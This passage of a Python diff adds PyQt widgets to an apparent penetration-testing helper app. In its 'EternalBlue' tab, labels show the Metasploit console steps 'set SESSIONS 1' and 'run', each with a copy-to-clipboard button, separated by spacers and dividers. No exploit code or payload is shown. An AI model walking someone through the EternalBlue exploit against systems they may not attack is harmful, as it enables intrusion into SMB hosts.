+        self.tab8_container_layout.insertWidget(85, self.smbhelper_EternalBlue_spacer1)
+        self.tab8_container_layout.insertWidget(86, self.smbhelper_EternalBlue_divider1)
+        self.tab8_container_layout.insertWidget(87, self.smbhelper_EternalBlue_divider2)
+        self.tab8_container_layout.insertWidget(88, self.smbhelper_EternalBlue_spacer2)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_Scan10
+        if hasattr(self, 'smbhelper_EternalBlue_Scan10'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan10)
+            self.smbhelper_EternalBlue_Scan10.deleteLater()
+        self.smbhelper_EternalBlue_Scan10 = QLabel("set SESSIONS 1")
+        self.smbhelper_EternalBlue_Scan10.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab8_container_layout.insertWidget(89,self.smbhelper_EternalBlue_Scan10)
+     
+        # smbhelper_EternalBlue_Scan10_Copy
+        if hasattr(self, 'smbhelper_EternalBlue_Scan10_Copy'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan10_Copy)
+            self.smbhelper_EternalBlue_Scan10_Copy.deleteLater()
+        self.smbhelper_EternalBlue_Scan10_Copy = QPushButton()
+        self.smbhelper_EternalBlue_Scan10_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.smbhelper_EternalBlue_Scan10_Copy.setFixedSize(QSize(20,20))
+        self.smbhelper_EternalBlue_Scan10_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan10.text()))
+        self.smbhelper_EternalBlue_Scan10_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # smbhelper_EternalBlue_Scan10 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan10_Copy)
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan10)
+        self.tab8_container_layout.insertLayout(90, label_layout)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_divider1
+        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
+            self.smbhelper_EternalBlue_divider1.deleteLater()
+        self.smbhelper_EternalBlue_divider1 = QFrame()
+        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_divider2
+        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
+            self.smbhelper_EternalBlue_divider2.deleteLater()
+        self.smbhelper_EternalBlue_divider2 = QFrame()
+        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_spacer1
+        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
+            self.smbhelper_EternalBlue_spacer1.deleteLater()
+        self.smbhelper_EternalBlue_spacer1 = QLabel()
+        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue_spacer2
+        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
+            self.smbhelper_EternalBlue_spacer2.deleteLater()
+        self.smbhelper_EternalBlue_spacer2 = QLabel()
+        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue spacer & divider layout
+        self.tab8_container_layout.insertWidget(91, self.smbhelper_EternalBlue_spacer1)
+        self.tab8_container_layout.insertWidget(92, self.smbhelper_EternalBlue_divider1)
+        self.tab8_container_layout.insertWidget(93, self.smbhelper_EternalBlue_divider2)
+        self.tab8_container_layout.insertWidget(94, self.smbhelper_EternalBlue_spacer2)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_Scan11
+        if hasattr(self, 'smbhelper_EternalBlue_Scan11'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan11)
+            self.smbhelper_EternalBlue_Scan11.deleteLater()
+        self.smbhelper_EternalBlue_Scan11 = QLabel("run")
+        self.smbhelper_EternalBlue_Scan11.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab8_container_layout.insertWidget(95,self.smbhelper_EternalBlue_Scan11)
+     
+        # smbhelper_EternalBlue_Scan11_Copy
+        if hasattr(self, 'smbhelper_EternalBlue_Scan11_Copy'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan11_Copy)
+            self.smbhelper_EternalBlue_Scan11_Copy.deleteLater()
+        self.smbhelper_EternalBlue_Scan11_Copy = QPushButton()
+        self.smbhelper_EternalBlue_Scan11_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.smbhelper_EternalBlue_Scan11_Copy.setFixedSize(QSize(20,20))
+        self.smbhelper_EternalBlue_Scan11_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan11.text()))
+        self.smbhelper_EternalBlue_Scan11_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # smbhelper_EternalBlue_Scan11 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan11_Copy)
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan11)
+        self.tab8_container_layout.insertLayout(96, label_layout)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_divider1
+        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
+            self.smbhelper_EternalBlue_divider1.deleteLater()
+        self.smbhelper_EternalBlue_divider1 = QFrame()
+        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_divider2
+        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
+            self.smbhelper_EternalBlue_divider2.deleteLater()
+        self.smbhelper_EternalBlue_divider2 = QFrame()
+        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_spacer1
+        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
+            self.smbhelper_EternalBlue_spacer1.deleteLater()
+        self.smbhelper_EternalBlue_spacer1 = QLabel()
+        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue_spacer2
+        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
+            self.smbhelper_EternalBlue_spacer2.deleteLater()
+        self.smbhelper_EternalBlue_spacer2 = QLabel()
+        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue spacer & divider layout
+        self.tab8_container_layout.insertWidget(97, self.smbhelper_EternalBlue_spacer1)
+        self.tab8_container_layout.insertWidget(98, self.smbhelper_EternalBlue_divider1)
+        self.tab8_container_layout.insertWidget(99, self.smbhelper_EternalBlue_divider2)
+        self.tab8_container_layout.insertWidget(100, self.smbhelper_EternalBlue_spacer2)
+        self.tab8_container_layout.addStretch()
+
 
 if __name__ == '__main__':
     app = QApplication(sys.argv)
